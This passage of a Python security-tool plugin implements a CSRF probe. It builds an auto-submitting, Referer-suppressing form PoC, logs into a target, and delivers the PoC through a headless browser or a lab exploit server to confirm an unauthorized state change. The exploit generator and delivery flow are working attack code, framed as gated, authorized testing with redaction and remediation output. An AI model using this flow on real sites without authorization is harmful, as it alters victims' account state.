"""Fail-closed CSRF confirmation primitives.

The first mode proves one narrow delivery-based CSRF variant: a state-changing
POST form has no token and Referer validation can be bypassed by omitting the
header.  The runtime tier authenticates a real browser context, serves the
tool-owned PoC from an intercepted same-site/cross-origin page, captures the
actual state-changing POST, and confirms the configured value in a fresh
authenticated response.  The lab tier preserves the original PortSwigger
exploit-server and unsolved-to-solved calibration flow.  Runtime credentials
and session material are never returned in cleartext.
"""

from __future__ import annotations

import hashlib
import html
import re
from typing import Any, Dict, Iterable, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    ALLOWED_ENGAGEMENTS,
    MAX_CREDENTIAL_CHARS,
    MAX_EVIDENCE_CHARS,
    MAX_RESPONSE_BYTES,
    REDACTED_RUNTIME_SECRET,
    _cookie_header,
    _field_name,
    _http_target,
    _path_and_query,
    _relative_path,
    _same_origin,
    extract_form_token,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"referer-absent-delivery"}
ALLOWED_PROOF_LEVELS = {"runtime-browser-state-change", "lab-state-change"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}
MAX_MARKER_CHARS = 512
MAX_STATE_VALUE_CHARS = 320
MAX_ACTION_VALUE_CHARS = 80
RESPONSE_HEAD = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
TOKEN_FIELD = re.compile(r"(?:csrf|xsrf|token|nonce)", re.I)
_LAB_ONLY_PARAMETERS = {
    "exploitServer",
    "exploitStorePath",
    "exploitResourcePath",
    "exploitHttpsField",
    "exploitFileField",
    "exploitHeadField",
    "exploitBodyField",
    "exploitActionField",
    "exploitHttpsValue",
    "exploitStoreValue",
    "exploitDeliverValue",
    "unsolvedMarker",
    "solvedMarker",
}
RUNTIME_EXPECTED_STEP_LABELS = (
    "login-page",
    "approved-login",
    "state-form-baseline",
    "browser-state-change-submit",
    "state-change-confirmation",
)
LAB_EXPECTED_STEP_LABELS = (
    "target-unsolved-baseline",
    "login-page",
    "approved-login",
    "state-form-baseline",
    "exploit-store",
    "browser-exploit-load",
    "browser-delivery-click",
    "browser-delivery-result",
    "target-solved-confirmation",
)
EXPECTED_STEP_LABELS_BY_PROOF_LEVEL = {
    "runtime-browser-state-change": RUNTIME_EXPECTED_STEP_LABELS,
    "lab-state-change": LAB_EXPECTED_STEP_LABELS,
}


def build_runtime_source_url(target: str) -> str:
    """Return a same-site, cross-origin proof URL on an intercepted port.

    SameSite=Lax cookies correctly block a genuinely cross-site POST, so using
    an unrelated ``.invalid`` host would turn a vulnerable Referer policy into
    a false negative.  Cookies are not port-scoped: a different port on the
    target host keeps the browser's real SameSite policy while remaining a
    distinct Origin that the tool fully intercepts and never connects to.
    """

    parsed = urlsplit(target)
    scheme = parsed.scheme.lower()
    hostname = parsed.hostname or ""
    if scheme not in {"http", "https"} or not hostname:
        raise ValueError("runtime CSRF target must use HTTP(S)")
    target_port = parsed.port or (443 if scheme == "https" else 80)
    source_port = 65_533 if target_port == 65_534 else 65_534
    formatted_host = f"[{hostname}]" if ":" in hostname else hostname
    return f"{scheme}://{formatted_host}:{source_port}/xasm-csrf-proof"


def build_delivery_control_selector(action_field: str, deliver_value: str) -> str:
    """Match only native submit controls for the configured delivery action."""

    def escape_attribute(value: str) -> str:
        return value.replace("\\", "\\\\").replace('"', '\\"')

    field = escape_attribute(action_field)
    value = escape_attribute(deliver_value)
    return (
        f'button[name="{field}"][value="{value}"], '
        f'input[type="submit"][name="{field}"][value="{value}"]'
    )


def canonicalize_form_newlines(value: str) -> str:
    """Apply the HTML form submission newline normalization for textareas."""

    return re.sub(r"\r\n|\r|\n", "\r\n", value)


def _origin(value: str) -> Tuple[str, str, int]:
    parsed = urlsplit(value)
    return (
        parsed.scheme.lower(),
        (parsed.hostname or "").lower(),
        parsed.port or (443 if parsed.scheme.lower() == "https" else 80),
    )


def _bounded_text(value: Any, minimum: int = 1, maximum: int = 512) -> Optional[str]:
    raw = str(value or "")
    if (
        len(raw) < minimum
        or len(raw) > maximum
        or "\r" in raw
        or "\n" in raw
        or "\0" in raw
    ):
        return None
    return raw


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, "target must be a credential-free HTTP(S) base URL without query or fragment"

    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be referer-absent-delivery"
    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-browser-state-change or lab-state-change"
    if str(parameters.get("engagement") or "").lower() not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"
    if parameters.get("stateChangeApproved") is not True:
        return False, "stateChangeApproved=true is required"

    for key in (
        "loginPath",
        "accountPath",
        "actionPath",
    ):
        if not _relative_path(parameters.get(key)):
            return False, f"{key} must be a bounded relative path"

    for key in (
        "usernameField",
        "passwordField",
        "stateField",
    ):
        if not _field_name(parameters.get(key)):
            return False, f"{key} must be a valid form-field name"
    login_csrf_field = parameters.get("loginCsrfField")
    if login_csrf_field is not None and not _field_name(login_csrf_field):
        return False, "loginCsrfField must be a valid form-field name"

    username = str(parameters.get("username") or "")
    password = str(parameters.get("password") or "")
    if not username or len(username) > MAX_CREDENTIAL_CHARS:
        return False, "username is required and must be bounded"
    if not password or len(password) > MAX_CREDENTIAL_CHARS:
        return False, "password is required and must be bounded"

    marker_keys = ("accountMarker",)
    markers = {key: str(parameters.get(key) or "") for key in marker_keys}
    for key, value in markers.items():
        if not _bounded_text(value, 3, MAX_MARKER_CHARS):
            return False, f"{key} must contain 3 to {MAX_MARKER_CHARS} bounded characters"
    state_value = str(parameters.get("stateValue") or "")
    if (
        not _bounded_text(state_value, 3, MAX_STATE_VALUE_CHARS)
        or any(character in state_value for character in '<>&"\'`')
    ):
        return False, "stateValue must be a bounded text value without markup characters"
    if TOKEN_FIELD.search(str(parameters.get("stateField") or "")):
        return False, "stateField must identify application state, not a token field"

    try:
        timeout = int(parameters.get("timeoutSeconds") or 20)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 5 or timeout > 45:
        return False, "timeoutSeconds must be between 5 and 45"

    if proof_level == "runtime-browser-state-change":
        unexpected = sorted(_LAB_ONLY_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for proofLevel=lab-state-change"
        return True, ""

    if str(parameters.get("engagement") or "").lower() not in STATE_CHANGE_ENGAGEMENTS:
        return False, "lab-state-change requires engagement lab or ctf"
    exploit_server = _http_target(parameters.get("exploitServer"))
    if not exploit_server:
        return False, "exploitServer must be a credential-free HTTP(S) base URL without query or fragment"
    if _origin(target) == _origin(exploit_server):
        return False, "exploitServer must be cross-origin from target"
    for key in ("exploitStorePath", "exploitResourcePath"):
        if not _relative_path(parameters.get(key)):
            return False, f"{key} must be a bounded relative path"
    for key in (
        "exploitHttpsField",
        "exploitFileField",
        "exploitHeadField",
        "exploitBodyField",
        "exploitActionField",
    ):
        if not _field_name(parameters.get(key)):
            return False, f"{key} must be a valid form-field name"
    unsolved_marker = str(parameters.get("unsolvedMarker") or "")
    solved_marker = str(parameters.get("solvedMarker") or "")
    for key, value in (("unsolvedMarker", unsolved_marker), ("solvedMarker", solved_marker)):
        if not _bounded_text(value, 3, MAX_MARKER_CHARS):
            return False, f"{key} must contain 3 to {MAX_MARKER_CHARS} bounded characters"
    if (
        unsolved_marker == solved_marker
        or unsolved_marker in solved_marker
        or solved_marker in unsolved_marker
    ):
        return False, "unsolvedMarker and solvedMarker must be unambiguous"
    for key in ("exploitStoreValue", "exploitDeliverValue", "exploitHttpsValue"):
        if not _bounded_text(parameters.get(key), 1, MAX_ACTION_VALUE_CHARS):
            return False, f"{key} must be a bounded single-line action value"
    if str(parameters["exploitStoreValue"]) == str(parameters["exploitDeliverValue"]):
        return False, "exploitStoreValue and exploitDeliverValue must be distinct"
    return True, ""


def _attribute(tag: str, name: str) -> Optional[str]:
    match = re.search(
        rf"\b{re.escape(name)}\s*=\s*(?:(['\"])(.*?)\1|([^\s>]+))",
        tag,
        re.I | re.S,
    )
    if not match:
        return None
    return html.unescape(match.group(2) if match.group(1) else match.group(3) or "")


def find_state_form(
    document: str,
    page_url: str,
    action_url: str,
    state_field: str,
) -> Optional[Dict[str, Any]]:
    """Return the exact POST state form only when it has no token-like field."""

    for match in re.finditer(r"<form\b(?P<head>[^>]*)>(?P<body>.*?)</form\s*>", document, re.I | re.S):
        head = match.group("head")
        body = match.group("body")
        method = (_attribute(head, "method") or "GET").upper()
        action = _attribute(head, "action") or _path_and_query(page_url)
        resolved_action = urljoin(page_url, action)
        if method != "POST" or resolved_action != action_url:
            continue
        names = []
        for control in re.finditer(r"<(?:input|textarea|select)\b[^>]*>", body, re.I | re.S):
            name = _attribute(control.group(0), "name")
            if name:
                names.append(name)
        if state_field not in names:
            continue
        token_fields = sorted({name for name in names if TOKEN_FIELD.search(name)})
        if token_fields:
            return {
                "valid": False,
                "action": resolved_action,
                "method": method,
                "fieldNames": sorted(set(names))[:50],
                "tokenFields": token_fields[:20],
            }
        return {
            "valid": True,
            "action": resolved_action,
            "method": method,
            "fieldNames": sorted(set(names))[:50],
            "tokenFields": [],
        }
    return None


def build_referer_absent_poc(action_url: str, state_field: str, state_value: str) -> str:
    escaped_url = html.escape(action_url, quote=True)
    escaped_field = html.escape(state_field, quote=True)
    escaped_value = html.escape(state_value, quote=True)
    return (
        "<!doctype html>\n"
        '<html><head><meta name="referrer" content="no-referrer"></head><body>\n'
        f'<form action="{escaped_url}" method="POST">\n'
        f'<input type="hidden" name="{escaped_field}" value="{escaped_value}">\n'
        "</form>\n"
        "<script>document.forms[0].submit();</script>\n"
        "</body></html>"
    )


def _header_values(headers: Any, name: str) -> list[str]:
    if hasattr(headers, "getall"):
        return [str(value) for value in headers.getall(name, [])]
    if isinstance(headers, dict):
        value = headers.get(name) or headers.get(name.lower())
        if value is None:
            return []
        if isinstance(value, list):
            return [str(item) for item in value]
        return [str(value)]
    return []


def _request_transcript(
    method: str,
    url: str,
    body: str,
    cookie: str,
    secret_values: Iterable[Any],
) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-CSRF-Probe/1.0",
        "Accept: text/html,application/xhtml+xml,application/json",
    ]
    if body:
        lines.extend(
            [
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body.encode('utf-8'))}",
            ]
        )
    if cookie:
        # Session material must never cross the native-agent boundary. Do not
        # rely on the caller remembering every cookie value in secret_values:
        # a response can establish multiple independent cookies.
        lines.append(f"Cookie: {REDACTED_RUNTIME_SECRET}")
    return sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + body,
        secret_values,
        MAX_EVIDENCE_CHARS,
    )


def _response_transcript(response: Dict[str, Any], secret_values: Iterable[Any]) -> str:
    lines = [f"HTTP/1.1 {response['status']} {response['reason']}"]
    for name in ("Content-Type", "Location", "Set-Cookie"):
        for value in _header_values(response.get("headers"), name):
            lines.append(
                f"{name}: "
                f"{REDACTED_RUNTIME_SECRET if name == 'Set-Cookie' else value}"
            )
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    return sanitize_evidence_text(raw, secret_values, MAX_EVIDENCE_CHARS)


def build_http_evidence_step(
    label: str,
    method: str,
    url: str,
    body: str,
    cookie: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Dict[str, Any]:
    request = _request_transcript(method, url, body, cookie, secret_values)
    response_text = _response_transcript(response, secret_values)
    return {
        "label": label,
        "request": request,
        "requestSha256": hashlib.sha256(request.encode("utf-8")).hexdigest(),
        "response": response_text,
        "responseSha256": hashlib.sha256(response_text.encode("utf-8")).hexdigest(),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(str(response.get("body") or "").encode("utf-8")),
        "responseExcerptTruncated": bool(response.get("truncated")),
    }


def build_browser_http_evidence_step(
    label: str,
    method: str,
    url: str,
    body: str,
    request_headers: Dict[str, Any],
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Dict[str, Any]:
    """Build evidence from the browser's actual target request.

    Header absence is material for this mode, so this deliberately serializes
    only the browser-observed allowlist instead of fabricating the normal probe
    headers.  Cookie values are redacted by ``sanitize_evidence_text``.
    """

    parsed = urlsplit(url)
    lowered = {str(key).lower(): str(value) for key, value in request_headers.items()}
    lines = [f"{method} {_path_and_query(url)} HTTP/1.1", f"Host: {parsed.netloc}"]
    for header in ("user-agent", "accept", "origin", "referer", "content-type", "cookie"):
        if header in lowered:
            display = "-".join(part.capitalize() for part in header.split("-"))
            value = REDACTED_RUNTIME_SECRET if header == "cookie" else lowered[header]
            lines.append(f"{display}: {value}")
    lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
    request = sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + body,
        secret_values,
        MAX_EVIDENCE_CHARS,
    )
    response_text = _response_transcript(response, secret_values)
    return {
        "label": label,
        "request": request,
        "requestSha256": hashlib.sha256(request.encode("utf-8")).hexdigest(),
        "response": response_text,
        "responseSha256": hashlib.sha256(response_text.encode("utf-8")).hexdigest(),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(str(response.get("body") or "").encode("utf-8")),
        "responseExcerptTruncated": bool(response.get("truncated")),
    }


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    runtime = verification.get("proofLevel") == "runtime-browser-state-change"
    return {
        "template-id": "xasm-csrf-referer-omission-verified",
        "matcher-name": "csrf-referer-omission-browser-delivery",
        "type": "http",
        "host": target,
        "matched-at": str(verification.get("actionUrl") or target),
        "info": {
            "name": "Verified CSRF via Referer Header Omission",
            "severity": "high",
            "description": (
                (
                    "A cross-origin auto-submitting form changed authenticated application "
                    "state to the tool-owned value after suppressing the Referer header. "
                    "The actual browser POST and a fresh state confirmation were captured."
                )
                if runtime
                else (
                    "A cross-origin auto-submitting form changed victim state after suppressing "
                    "the Referer header. The proof was delivered through a real browser and "
                    "caused the configured unsolved-to-solved transition."
                )
            ),
            "remediation": (
                "Require an unpredictable session-bound CSRF token on every state-changing "
                "request, validate Origin as defense in depth, and use SameSite cookies "
                "without relying on Referer presence alone."
            ),
            "classification": {"cwe-id": ["CWE-352"]},
        },
        "evidence": verification,
    }


class CsrfProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:csrf_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms Referer-omission CSRF with a generated form PoC and a real "
            "Playwright state change; the optional lab tier preserves the scoped "
            "exploit-host and unsolved-to-solved calibration proof."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        lab_only_fields = sorted(_LAB_ONLY_PARAMETERS)
        return {
            "type": "object",
            "additionalProperties": False,
            "properties": {
                "target": {"type": "string", "description": "Authorized application base URL"},
                "url": {"type": "string", "description": "Alias for target"},
                "exploitServer": {
                    "type": "string",
                    "description": "Authorized form-based exploit-host base URL",
                },
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {"type": "string", "enum": sorted(ALLOWED_PROOF_LEVELS)},
                "loginPath": {"type": "string"},
                "accountPath": {"type": "string"},
                "actionPath": {"type": "string"},
                "exploitStorePath": {"type": "string"},
                "exploitResourcePath": {"type": "string"},
                "usernameField": {"type": "string"},
                "passwordField": {"type": "string"},
                "loginCsrfField": {"type": "string"},
                "stateField": {"type": "string"},
                "username": {"type": "string", "x-hidden": True},
                "password": {"type": "string", "x-hidden": True},
                "stateValue": {"type": "string"},
                "accountMarker": {"type": "string"},
                "unsolvedMarker": {"type": "string"},
                "solvedMarker": {"type": "string"},
                "exploitHttpsField": {"type": "string"},
                "exploitFileField": {"type": "string"},
                "exploitHeadField": {"type": "string"},
                "exploitBodyField": {"type": "string"},
                "exploitActionField": {"type": "string"},
                "exploitHttpsValue": {"type": "string"},
                "exploitStoreValue": {"type": "string"},
                "exploitDeliverValue": {"type": "string"},
                "engagement": {
                    "type": "string",
                    "enum": ["standard", *sorted(ALLOWED_ENGAGEMENTS)],
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 5, "maximum": 45},
            },
            "required": [
                "mode",
                "proofLevel",
                "loginPath",
                "accountPath",
                "actionPath",
                "usernameField",
                "passwordField",
                "stateField",
                "username",
                "password",
                "stateValue",
                "accountMarker",
                "engagement",
                "allowUnsafeMethods",
                "stateChangeApproved",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "allOf": [
                {
                    "if": {"properties": {"proofLevel": {"const": "lab-state-change"}}},
                    "then": {"required": lab_only_fields},
                    "else": {
                        "not": {
                            "anyOf": [{"required": [field]} for field in lab_only_fields]
                        }
                    },
                }
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "credentials", "exploit-host"],
            "output_type": ["findings", "csrf_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm CSRF through Referer omission and browser delivery",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        body: Optional[str] = None,
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-CSRF-Probe/1.0",
            "Accept": "text/html,application/xhtml+xml,application/json",
        }
        if body is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        async with session.request(
            method,
            url,
            headers=headers,
            data=body,
            allow_redirects=False,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
            }

    async def _browser_deliver(
        self,
        exploit_url: str,
        action_field: str,
        deliver_value: str,
        timeout: int,
    ) -> Dict[str, Any]:
        try:
            from playwright.async_api import async_playwright
        except Exception as exc:
            raise ValueError(f"Playwright is unavailable for browser delivery: {exc}") from exc

        async with async_playwright() as playwright:
            browser = await playwright.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage"],
            )
            try:
                context = await browser.new_context(ignore_https_errors=False)
                page = await context.new_page()
                load_response = await page.goto(
                    exploit_url,
                    wait_until="domcontentloaded",
                    timeout=timeout * 1_000,
                )
                if load_response is None or load_response.url != exploit_url:
                    raise ValueError("browser exploit load did not return the configured URL")
                load_raw = await load_response.body()
                if len(load_raw) > MAX_RESPONSE_BYTES:
                    raise ValueError("browser exploit-load response exceeded the evidence limit")
                load_result = {
                    "status": load_response.status,
                    "reason": str(load_response.status_text or "")[:100],
                    "headers": await load_response.all_headers(),
                    "body": load_raw.decode("utf-8", errors="replace").replace("\0", ""),
                    "truncated": False,
                }

                selector = build_delivery_control_selector(action_field, deliver_value)
                delivery_control = page.locator(selector)
                if await delivery_control.count() != 1:
                    raise ValueError("configured browser delivery control was not uniquely present")
                if not await delivery_control.is_visible() or not await delivery_control.is_enabled():
                    raise ValueError("configured browser delivery control was not actionable")

                async with page.expect_response(
                    lambda response: (
                        response.request.method == "POST"
                        and response.url == exploit_url
                    ),
                    timeout=timeout * 1_000,
                ) as response_info:
                    async with page.expect_navigation(
                        wait_until="domcontentloaded",
                        timeout=timeout * 1_000,
                    ) as navigation_info:
                        await delivery_control.click(timeout=timeout * 1_000)
                delivery_response = await response_info.value
                outcome_response = await navigation_info.value
                delivery_request = delivery_response.request
                delivery_raw = (
                    b""
                    if delivery_response.status in {301, 302, 303, 307, 308}
                    else await delivery_response.body()
                )
                if len(delivery_raw) > MAX_RESPONSE_BYTES:
                    raise ValueError("browser delivery response exceeded the evidence limit")
                delivery_result = {
                    "status": delivery_response.status,
                    "reason": str(delivery_response.status_text or "")[:100],
                    "headers": await delivery_response.all_headers(),
                    "body": delivery_raw.decode("utf-8", errors="replace").replace("\0", ""),
                    "truncated": False,
                }
                if outcome_response is None:
                    raise ValueError("browser delivery did not complete a navigation")
                outcome_raw = await outcome_response.body()
                if len(outcome_raw) > MAX_RESPONSE_BYTES:
                    raise ValueError("browser delivery-outcome response exceeded the evidence limit")
                outcome_result = {
                    "status": outcome_response.status,
                    "reason": str(outcome_response.status_text or "")[:100],
                    "headers": await outcome_response.all_headers(),
                    "body": outcome_raw.decode("utf-8", errors="replace").replace("\0", ""),
                    "truncated": False,
                }
                return {
                    "browserUsed": True,
                    "loadMethod": "GET",
                    "loadUrl": load_response.url,
                    "loadBody": "",
                    "loadResponse": load_result,
                    "deliveryMethod": delivery_request.method,
                    "deliveryUrl": delivery_request.url,
                    "deliveryBody": delivery_request.post_data or "",
                    "deliveryResponse": delivery_result,
                    "outcomeMethod": outcome_response.request.method,
                    "outcomeUrl": outcome_response.url,
                    "outcomeBody": outcome_response.request.post_data or "",
                    "outcomeResponse": outcome_result,
                }
            finally:
                await browser.close()

    async def _playwright_response_result(self, response: Any) -> Dict[str, Any]:
        status = int(response.status)
        raw = b"" if status in {301, 302, 303, 307, 308} else await response.body()
        truncated = len(raw) > MAX_RESPONSE_BYTES
        raw = raw[:MAX_RESPONSE_BYTES]
        all_headers = getattr(response, "all_headers", None)
        headers = (
            await all_headers()
            if callable(all_headers)
            else dict(getattr(response, "headers", {}) or {})
        )
        return {
            "status": status,
            "reason": str(response.status_text or "")[:100],
            "headers": headers,
            "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
            "truncated": truncated,
        }

    async def _browser_runtime_flow(
        self,
        target: str,
        urls: Dict[str, str],
        fields: Dict[str, str],
        username: str,
        password: str,
        state_value: str,
        account_marker: str,
        login_csrf_field: str,
        poc_body: str,
        timeout: int,
    ) -> Dict[str, Any]:
        """Run the runtime proof in one BrowserContext-owned cookie store."""

        try:
            from playwright.async_api import async_playwright
        except Exception as exc:
            raise ValueError(f"Playwright is unavailable for browser delivery: {exc}") from exc

        async with async_playwright() as playwright:
            browser = await playwright.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage"],
            )
            try:
                context = await browser.new_context(ignore_https_errors=False)

                async def cookie_header(url: str) -> str:
                    cookies = await context.cookies([url])
                    return "; ".join(
                        f"{cookie['name']}={cookie['value']}" for cookie in cookies
                    )

                login_page_cookie = await cookie_header(urls["login"])
                login_page_api = await context.request.get(
                    urls["login"],
                    max_redirects=0,
                    timeout=timeout * 1_000,
                )
                login_page = await self._playwright_response_result(login_page_api)
                if login_page["truncated"] or login_page["status"] != 200:
                    raise ValueError("login page did not return a bounded HTTP 200 response")
                login_csrf_token: Optional[str] = None
                if login_csrf_field:
                    login_csrf_token = extract_form_token(
                        login_page["body"], login_csrf_field
                    )
                    if not login_csrf_token:
                        raise ValueError("configured login CSRF field was not found")

                login_form = {
                    fields["usernameField"]: username,
                    fields["passwordField"]: password,
                }
                if login_csrf_field and login_csrf_token:
                    login_form[login_csrf_field] = login_csrf_token
                login_body = urlencode(login_form)
                login_cookie = await cookie_header(urls["login"])
                login_api = await context.request.post(
                    urls["login"],
                    data=login_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    max_redirects=0,
                    timeout=timeout * 1_000,
                )
                login_response = await self._playwright_response_result(login_api)
                login_location = str(login_response["headers"].get("location") or "")
                login_redirect = urljoin(urls["login"], login_location)
                if (
                    login_response["truncated"]
                    or login_response["status"] not in {302, 303}
                    or not login_location
                    or not _same_origin(target, login_redirect)
                ):
                    raise ValueError("login did not complete a same-origin redirect")

                account_cookie = await cookie_header(urls["account"])
                if not account_cookie:
                    raise ValueError("approved login did not establish an authenticated cookie")
                baseline_api = await context.request.get(
                    urls["account"],
                    max_redirects=0,
                    timeout=timeout * 1_000,
                )
                account_response = await self._playwright_response_result(baseline_api)
                state_form = find_state_form(
                    account_response["body"],
                    urls["account"],
                    urls["action"],
                    fields["stateField"],
                )
                if (
                    account_response["truncated"]
                    or account_response["status"] != 200
                    or account_marker not in account_response["body"]
                    or state_value in account_response["body"]
                    or not state_form
                    or state_form.get("valid") is not True
                ):
                    raise ValueError(
                        "account baseline did not prove a token-free form and absent state value"
                    )

                source_url = build_runtime_source_url(target)
                source_origin = source_url.rsplit("/", 1)[0]
                document_requests = []
                page = await context.new_page()
                page.on(
                    "request",
                    lambda request: document_requests.append(request.url)
                    if request.resource_type == "document"
                    else None,
                )

                async def scoped_route(route: Any) -> None:
                    request_url = route.request.url
                    if request_url == source_url:
                        await route.fulfill(
                            status=200,
                            content_type="text/html; charset=utf-8",
                            body=poc_body,
                        )
                    elif _same_origin(target, request_url):
                        await route.continue_()
                    else:
                        await route.abort()

                await page.route("**/*", scoped_route)
                async with page.expect_response(
                    lambda response: (
                        response.request.method == "POST"
                        and response.url == urls["action"]
                    ),
                    timeout=timeout * 1_000,
                ) as response_info:
                    await page.goto(
                        source_url,
                        wait_until="domcontentloaded",
                        timeout=timeout * 1_000,
                    )
                delivery_response_raw = await response_info.value
                delivery_request = delivery_response_raw.request
                delivery_headers = await delivery_request.all_headers()
                delivery_body = delivery_request.post_data or ""
                delivery_response = await self._playwright_response_result(
                    delivery_response_raw
                )
                lowered_headers = {
                    str(key).lower(): str(value)
                    for key, value in delivery_headers.items()
                }
                expected_delivery_body = urlencode({fields["stateField"]: state_value})
                if (
                    delivery_request.method != "POST"
                    or delivery_request.url != urls["action"]
                    or delivery_body != expected_delivery_body
                    or lowered_headers.get("referer")
                    or lowered_headers.get("origin") not in {source_origin, "null"}
                    or not lowered_headers.get("cookie")
                    or delivery_response["truncated"]
                    or delivery_response["status"] < 200
                    or delivery_response["status"] >= 400
                ):
                    raise ValueError(
                        "browser did not submit the exact authenticated Referer-absent state change"
                    )
                if page.url != source_url and not _same_origin(target, page.url):
                    raise ValueError("browser state-change navigation left the target origin")

                confirmation_cookie = await cookie_header(urls["account"])
                confirmation_api = await context.request.get(
                    urls["account"],
                    max_redirects=0,
                    timeout=timeout * 1_000,
                )
                confirmation = await self._playwright_response_result(confirmation_api)
                if (
                    not confirmation_cookie
                    or confirmation["truncated"]
                    or confirmation["status"] != 200
                    or account_marker not in confirmation["body"]
                    or state_value not in confirmation["body"]
                ):
                    raise ValueError(
                        "fresh authenticated response did not confirm the submitted state value"
                    )

                return {
                    "loginPageCookie": login_page_cookie,
                    "loginPage": login_page,
                    "loginCsrfToken": login_csrf_token,
                    "loginBody": login_body,
                    "loginCookie": login_cookie,
                    "loginResponse": login_response,
                    "accountCookie": account_cookie,
                    "accountResponse": account_response,
                    "stateForm": state_form,
                    "deliveryBody": delivery_body,
                    "deliveryHeaders": delivery_headers,
                    "deliveryResponse": delivery_response,
                    "confirmationCookie": confirmation_cookie,
                    "confirmation": confirmation,
                    "auxiliaryRequests": max(1, len(document_requests) - 1),
                }
            finally:
                await browser.close()

    async def _execute_runtime(
        self,
        parameters: Dict[str, Any],
        target: str,
    ) -> Dict[str, Any]:
        paths = {
            key: str(parameters[key])
            for key in ("loginPath", "accountPath", "actionPath")
        }
        urls = {
            "login": urljoin(target, paths["loginPath"]),
            "account": urljoin(target, paths["accountPath"]),
            "action": urljoin(target, paths["actionPath"]),
        }
        fields = {
            key: str(parameters[key])
            for key in ("usernameField", "passwordField", "stateField")
        }
        username = str(parameters["username"])
        password = str(parameters["password"])
        state_value = str(parameters["stateValue"])
        account_marker = str(parameters["accountMarker"])
        login_csrf_field = str(parameters.get("loginCsrfField") or "").strip()
        timeout = int(parameters.get("timeoutSeconds") or 20)
        poc_body = build_referer_absent_poc(
            urls["action"], fields["stateField"], state_value
        )
        poc_sha256 = hashlib.sha256(poc_body.encode("utf-8")).hexdigest()

        try:
            flow = await self._browser_runtime_flow(
                target,
                urls,
                fields,
                username,
                password,
                state_value,
                account_marker,
                login_csrf_field,
                poc_body,
                timeout,
            )
            token = flow.get("loginCsrfToken")
            evidence_steps = [
                build_http_evidence_step(
                    RUNTIME_EXPECTED_STEP_LABELS[0],
                    "GET",
                    urls["login"],
                    "",
                    str(flow.get("loginPageCookie") or ""),
                    flow["loginPage"],
                    (password, token),
                ),
                build_http_evidence_step(
                    RUNTIME_EXPECTED_STEP_LABELS[1],
                    "POST",
                    urls["login"],
                    str(flow["loginBody"]),
                    str(flow.get("loginCookie") or ""),
                    flow["loginResponse"],
                    (password, token),
                ),
                build_http_evidence_step(
                    RUNTIME_EXPECTED_STEP_LABELS[2],
                    "GET",
                    urls["account"],
                    "",
                    str(flow.get("accountCookie") or ""),
                    flow["accountResponse"],
                    (password, token),
                ),
                build_browser_http_evidence_step(
                    RUNTIME_EXPECTED_STEP_LABELS[3],
                    "POST",
                    urls["action"],
                    str(flow["deliveryBody"]),
                    dict(flow["deliveryHeaders"]),
                    flow["deliveryResponse"],
                    (password, token),
                ),
                build_http_evidence_step(
                    RUNTIME_EXPECTED_STEP_LABELS[4],
                    "GET",
                    urls["account"],
                    "",
                    str(flow.get("confirmationCookie") or ""),
                    flow["confirmation"],
                    (password, token),
                ),
            ]
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": str(exc)[:500],
                "requestCount": 0,
                "findings": [],
            }

        request_count = len(evidence_steps)
        verification = {
            "verified": True,
